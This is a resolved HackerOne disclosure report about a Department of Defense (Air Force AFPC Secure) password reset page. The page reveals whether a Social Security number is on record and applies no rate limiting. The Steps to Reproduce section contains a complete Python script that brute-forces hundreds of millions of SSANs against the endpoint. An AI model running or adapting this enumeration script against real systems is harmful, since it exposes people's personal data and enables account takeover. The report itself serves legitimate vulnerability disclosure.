---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/information-exposure-through-an-error-message
  - env/web
substate: "resolved"
weakness: "Information Exposure Through an Error Message"
enriched: true
body: true
date: 2024-10-25
submitted: 2024-09-29T13:44:30.224Z
bounty_usd: null
votes: 98
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "hypervis0r"
source: "https://hackerone.com/reports/2748003"
title: "Lack of rate limiting in https://███/PKI/PassReset.aspx leads to PII disclosure and potential account takeover"
---
# Lack of rate limiting in https://███/PKI/PassReset.aspx leads to PII disclosure and potential account takeover

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 98 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2024-10-25

- Report: [https://hackerone.com/reports/2748003](https://hackerone.com/reports/2748003)
- CWE: Information Exposure Through an Error Message
- Submitted: 2024-09-29T13:44:30.224Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The password reset functionality of AFPC Secure is intended to be used by users who do not have a PKI credential for AFPC secure. It allows a user to provide their SSAN and Mother's Maiden Name to reset their password. The issue lies in the fact that if an SSAN for a user with an active PKI credential is found, the system will inform the user of that fact with the following error message:
```
Your account was found, but our records indicate you are either Military, Civilian, or a Contractor with a CAC, which you must use to reset your password. For more information, please click the link above labeled "Help with accessing AFPCSecure using a CAC"
```

Additionally, there is no rate limiting done for this site, meaning an attacker can brute force through approximately 772,000,000 social security numbers to find SSANs for active U.S. Air Force personnel. Furthermore, if any SSANs are found that aren't tied to active PKI credentials (i.e. authorized UserId/Password users, POW-MIA Next of Kin users), an attacker could potentially trigger a password reset by brute forcing the mother's maiden name field (for example, going through most common last names).

Please see the steps to reproduce for a proof-of-concept script that brute forces SSANs with the password reset functionality.

## Impact

This vulnerability can lead to the exposure of personally identifiable information for U.S. Air Force personnel, and can potentially lead to an account takeover in the right circumstances.

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
See the following Python script for a proof-of-concept. The script will brute force through 772,000,000 SSANs by default, you can adjust the minimum and maximum search range on line 87. Uncomment line 84 to do a single SSAN search.

```python
import requests
from tqdm import tqdm
from bs4 import BeautifulSoup
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Get all the hidden ASP.NET inputs
def __get_hidden_input(content):
    """ Return the dict contain the hidden input 
    """
    tags = dict()
    soup =BeautifulSoup(content, 'html.parser')
    hidden_tags = soup.find_all('input', type='hidden')
    # print(*hidden_tags)
    for tag in hidden_tags:
        tags[tag.get('name')] = tag.get('value')
    
    return tags

url = "https://█████"

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36"}

session = requests.Session()

# Simulate ASP.NET post back function
def doPostBack(url, data):
    resp = session.get(url, headers=headers, verify=False)
    asp_info = __get_hidden_input(resp.text)

    asp_info.update(data)

    return session.post(url,  data=asp_info, headers=headers, verify=False)

# Click check portal button
data = {"btnOK": "OK"}
resp = doPostBack(url + "/CheckPortal.aspx", data)

# Go to forgot password page
data = {"__EVENTTARGET": "ctl00$cphPage$btnForgotPassword"}
resp = doPostBack(url + "/PKI/default.aspx", data)

# Go to password reset page
data = {"ctl00$cphPage$btnPOW": "Online Password Reset"}
resp = doPostBack(url + "/PKI/PassReset1.aspx", data)
print(resp.text)

# Get the ASP.NET inputs for the password reset page
asp_info = __get_hidden_input(resp.text)

def range_search(min=0, max=772000000):
    for ssan in tqdm(range(min, max)):
        data = asp_info
        data["ctl00$cphPage$txtSSAN"] = str(ssan).zfill(9)
        data["ctl00$phPage$txtMMN"] = "NONEXISTANT"
        data["ctl00$cphPage$btnSubmit"] = "Submit"

        resp = session.post(url + "/PKI/PassReset.aspx", data=data, verify=False, allow_redirects=False)

        if resp.status_code != 200:
            print(f"!! Error, resp code {resp.status_code}\n{resp.text}")

        if ("SSAN Does not match a ssan in our records." not in resp.text):
            print(f"[+] Found potential SSAN: {str(ssan).zfill(9)}")

def single_search(ssan):
    data = asp_info
    data["ctl00$cphPage$txtSSAN"] = str(ssan).zfill(9)
    data["ctl00$phPage$txtMMN"] = "NONEXISTANT"
    data["ctl00$cphPage$btnSubmit"] = "Submit"

    resp = session.post(url + "/PKI/PassReset.aspx", data=data, verify=False, allow_redirects=False)
    
    print(resp.text)

    if resp.status_code != 200:
        print(f"!! Error, resp code {resp.status_code}\n{resp.text}")

    if ("SSAN Does not match a ssan in our records." not in resp.text):
        print(f"[+] Found potential SSAN: {str(ssan).zfill(9)}")

# Single search, provide SSAN to test
#single_search(555001337)

# Range search, specify min/max to set range
range_search()
```

## Suggested Mitigation/Remediation Actions
Implement a rate limit for https://███████/. Additionally, adjust the error message to not give out more information than necessary.

## Timeline

- **Report Filed**
- **2024-09-29** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
